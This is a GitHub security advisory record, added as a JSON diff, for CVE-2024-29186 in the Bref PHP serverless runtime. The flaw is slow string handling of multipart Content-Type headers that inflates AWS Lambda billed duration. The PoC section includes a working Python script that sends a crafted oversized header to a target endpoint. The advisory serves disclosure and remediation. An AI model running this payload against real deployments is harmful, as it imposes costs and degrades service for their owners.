@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-j4hq-f63x-f39r",
+  "modified": "2024-03-22T20:02:19Z",
+  "published": "2024-03-22T16:57:40Z",
+  "aliases": [
+    "CVE-2024-29186"
+  ],
+  "summary": "Slow String Operations via MultiPart Requests in Event-Driven Functions",
+  "details": "## Impacted Resources\n\nbref/src/Event/Http/Psr7Bridge.php:94-125\nmultipart-parser/src/StreamedPart.php:383-418\n\n## Description\n\nWhen Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object.\nDuring the conversion process, if the request is a MultiPart, each part is parsed. In the parsing process, the `Content-Type` header of each part is read using the [`Riverline/multipart-parser`](https://github.com/Riverline/multipart-parser/) library.\n\nThe library, in the `StreamedPart::parseHeaderContent` function, performs slow multi-byte string operations on the header value.\nPrecisely, the [`mb_convert_encoding`](https://www.php.net/manual/en/function.mb-convert-encoding.php) function is used with the first (`$string`) and third (`$from_encoding`) parameters read from the header value.\n\n## Impact\n\nAn attacker could send specifically crafted requests which would force the server into performing long operations with a consequent long billed duration.\n\nThe attack has the following requirements and limitations:\n- The Lambda should use the Event-Driven Function runtime.\n- The Lambda should use the `RequestHandlerInterface` handler.\n- The Lambda should implement at least an endpoint accepting POST requests.\n- The attacker can send requests up to 6MB long (this is enough to cause a billed duration between 400ms and 500ms with the default 1024MB RAM Lambda image of Bref).\n- If the Lambda uses a PHP runtime <= php-82 the impact is higher as the billed duration in the default 1024MB RAM Lambda image of Bref could be brought to more than 900ms for each request.\n\nNotice that the vulnerability applies only to headers read from the request body as the request header has a limitation which allows a total maximum size of ~10KB.\n\n## PoC\n\n1. Create a new Bref project.\n2. Create an `index.php` file with the following content:\n```php\n<?php\n\nnamespace App;\n\nrequire __DIR__ . '/vendor/autoload.php';\n\nuse Nyholm\\Psr7\\Response;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass MyHttpHandler implements RequestHandlerInterface\n{\n    public function handle(ServerRequestInterface $request): ResponseInterface\n    {\n        return new Response(200, [], \"OK\");\n    }\n}\n\nreturn new MyHttpHandler();\n\n```\n3. Use the following `serverless.yml` to deploy the Lambda:\n```yaml\nservice: app\n\nprovider:\n    name: aws\n    region: eu-central-1\n\nplugins:\n    - ./vendor/bref/bref\n\n# Exclude files from deployment\npackage:\n    patterns:\n        - '!node_modules/**'\n        - '!tests/**'\n\nfunctions:\n    api:\n        handler: index.php\n        runtime: php-83\n        events:\n            - httpApi: 'ANY /endpoint'\n```\n4. Run the following python script with as first argument the domain assigned to the Lambda (e.g. `python3 poc.py a10avtqg5c.execute-api.eu-central-1.amazonaws.com`):\n```python\nfrom requests import post\nfrom sys import argv\n\nif len(argv) != 2:\n    print(f\"Usage: {argv[0]} <domain>\")\n    exit()\n\nurl = f\"https://{argv[1]}/endpoint\"\nheaders = {\"Content-Type\": \"multipart/form-data; boundary=a\"}\ndata_normal = f\"--a\\r\\nContent-Disposition: form-data; name=\\\"0\\\"\\r\\n\\r\\nContent-Type: ;*=auto''{('a'*(4717792))}'\\r\\n--a--\\r\\n\"\ndata_malicious = f\"--a\\r\\nContent-Disposition: form-data; name=\\\"0\\\"\\r\\nContent-Type: ;*=auto''{('a'*(4717792))}'\\r\\n\\r\\n\\r\\n--a--\\r\\n\"\n\nprint(\"[+] Sending normal request\")\npost(url, headers=headers, data=data_normal)\n\nprint(\"[+] Sending malicious request\")\npost(url, headers=headers, data=data_malicious)\n\n```\n5. Observe the CloudWatch logs of the Lambda and notice that the first requests used less than 200ms of billed duration, while the second one, which has a malicious `Content-Type` header, used more than 400ms of billed duration.\n\n## Suggested Remediation\n\nPerform an additional validation on the headers parsed via the `StreamedPart::parseHeaderContent` function to allow only legitimate headers with a reasonable length.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "bref/bref"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.1.17"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-29186"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/brefphp/bref"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-22T16:57:40Z",
+    "nvd_published_at": "2024-03-22T17:15:08Z"
+  }
+}
